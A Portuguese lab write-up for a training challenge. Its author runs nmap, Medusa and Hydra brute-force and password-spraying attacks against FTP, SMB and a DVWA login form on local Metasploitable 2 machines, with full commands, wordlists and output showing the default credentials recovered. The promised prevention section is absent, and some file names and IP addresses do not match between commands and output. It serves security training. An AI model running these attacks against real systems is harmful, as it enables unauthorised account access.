# DesafioDio---Simulando-um-Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.


Primeira etapa do desafio: Configurar o ambiente.

- Foi feita a configuração utilizando as VMs Kali Linux e Metasploitable 2 no VirtualBox. As VMs foram conectadas a rede interna (host-only) e as duas conseguiram se comunicar.

Segunda etapa do desafio: Executar ataques simulados.

Antes de executar os ataques, verifiquei com o NMAP as portas que estavam abertas na automação através do comando:
  nmap -sV -p 21,22,80,443,139 192.168.56.105
A resposta que obtive foi que as portas 21 (FTP), 22 (SSH), 80 (HTTP), 139 (netbios-ssn) estão abertas. A porta 443 (HTTPS) está fechada.

  Força Bruta em FTP:
    Os meus comandos utilizados foram os seguintes.
      Para criação da Lista de usuários utilizei o comando: "echo -e 'user\nmsfadmin\nadmin\nroot' > user.txt"
      Para criação da Lista de senhas utilizei o comando: "echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt"
      Após a criação das listas, comecei o ataque de força bruta com o seguinte comando: "medusa -h 192.168.56.103 -U user.txt -P pass.txt -M ftp -t 6" e obtive a seguinte saída:

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (1 of 4 complete)
2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (2 of 4 complete)
2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (3 of 4 complete)
2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (1 of 4 complete)
2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 4 complete)
2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
2025-11-30 14:02:53 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-11-30 14:02:53 ACCOUNT FOUND: [ftp] Host: 192.168.56.105 User: msfadmin Password: msfadmin [SUCCESS]
2025-11-30 14:02:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-11-30 14:02:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-11-30 14:02:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (2 of 4 complete)
2025-11-30 14:02:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (3 of 4 complete)
2025-11-30 14:02:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (4 of 4 complete)
2025-11-30 14:02:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-11-30 14:03:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (2 of 4 complete)
2025-11-30 14:03:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-11-30 14:03:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (4 of 4 complete)

    O usuário para logar via FTP é msfadmin e a senha é msfadmin

Automação de tentativas em formulário web (DVWA):
  Para fazer a a tentiva por formulário eu achei melhor utilizar o Hydra. Utilizei as mesmas listas citadas acima. Segue o meu comando.

  hydra -L user.txt -P pass.txt 192.168.56.105 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
  
  Segue a saída do comando: 

    Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-30 14:07:23
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
    [DATA] attacking http-post-form://192.168.56.105:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
    [80][http-post-form] host: 192.168.56.105   login: admin   password: password
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-30 14:07:25

  O usuário para logar no http://192.168.56.105/dvwa/login.php é "admin" e a senha é "password"

Password spraying em SMB com enumeração de usuários:

  Utilizando os conteúdos aplicados eu utilizei o "enum4linux" para enumerar os usuários e logo em seguida tratei os dados e adicionei em um txt chamado smb_users.txt. Foquei nos usuários que possuem permissão de login, no final o arquivo ficou com os seguintes nomes:
  msfadmin
  user
  postgres
  service
  root
  ftp

  Após esse tratamento, utilizei o Medusa pra seguir com o Password spraying. Segue o comando e a saída.

    medusa -h 192.168.56.105 -U usuarios_smb.txt -P senhas_spray.txt -M smbnt

    Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (1 of 6, 0 complete) Password: password (1 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (1 of 6, 0 complete) Password: 123456 (2 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (1 of 6, 0 complete) Password: Welcome123 (3 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (2 of 6, 1 complete) Password: password (1 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: msfadmin (1 of 6, 1 complete) Password: msfadmin (4 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT FOUND: [smbnt] Host: 192.168.56.105 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (2 of 6, 2 complete) Password: 123456 (2 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (2 of 6, 2 complete) Password: Welcome123 (3 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: user (2 of 6, 3 complete) Password: msfadmin (4 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: postgres (3 of 6, 3 complete) Password: password (1 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: postgres (3 of 6, 3 complete) Password: 123456 (2 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: postgres (3 of 6, 3 complete) Password: Welcome123 (3 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: postgres (3 of 6, 4 complete) Password: msfadmin (4 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: service (4 of 6, 4 complete) Password: password (1 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: service (4 of 6, 4 complete) Password: Welcome123 (2 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: service (4 of 6, 4 complete) Password: 123456 (3 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: service (4 of 6, 5 complete) Password: msfadmin (4 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (5 of 6, 5 complete) Password: password (1 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (5 of 6, 5 complete) Password: Welcome123 (2 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (5 of 6, 5 complete) Password: 123456 (3 of 4 complete)
    2025-11-30 14:22:13 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: root (5 of 6, 6 complete) Password: msfadmin (4 of 4 complete)
    2025-11-30 14:22:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: ftp (6 of 6, 6 complete) Password: password (1 of 4 complete)
    2025-11-30 14:22:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: ftp (6 of 6, 6 complete) Password: Welcome123 (2 of 4 complete)
    2025-11-30 14:22:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: ftp (6 of 6, 6 complete) Password: 123456 (3 of 4 complete)
    2025-11-30 14:22:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.105 (1 of 1, 0 complete) User: ftp (6 of 6, 7 complete) Password: msfadmin (4 of 4 complete)

  Ou seja, o usuário pra login via smbnt é msfadmin e a senha é msfadmin.
